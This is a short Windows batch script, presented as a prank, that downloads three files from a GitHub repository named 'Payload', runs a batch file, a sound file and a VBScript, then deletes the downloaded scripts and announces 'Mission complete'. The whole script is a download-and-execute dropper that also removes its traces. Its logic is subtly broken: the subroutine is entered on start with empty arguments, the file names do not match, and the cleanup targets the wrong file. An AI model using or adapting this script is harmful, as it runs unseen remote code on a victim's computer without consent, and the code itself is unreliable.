@echo off
setlocal

:: Function to retry download
:downloadFile
set "url=%~1"
set "target=%~2"
:retry
curl -O "%url%"
if not exist "%target%" (
    echo [Retry] Failed to download %target%. Retrying in 5 seconds...
    timeout /t 5 > nul
    goto retry
)
echo [OK] Downloaded %target%.
goto :eof

:: Download each file with retry mechanism
echo Downloading prank files...
call :downloadFile https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2 talk2
call :downloadFile https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav sound.wav
call :downloadFile https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat startexc.bat

:: Launch the files
timeout 10 > nul
start "" startexc.bat
start "" sound.wav
start "" talk2.vbs

:: Check if talk2.vbs launched (optional)
timeout 3 > nul
tasklist | findstr /i "wscript.exe" > nul
if errorlevel 1 (
    echo [Warning] talk2.vbs may not have started properly.
)

:: Cleanup
timeout 5 > nul
if exist talk.vbs (
    del /f /q "talk.vbs"
    echo Deleted talk.vbs
)
if exist startexc.bat (
    del /f /q "startexc.bat"
    echo Deleted startexc.bat
)

echo Done. Mission complete. 😈
endlocal
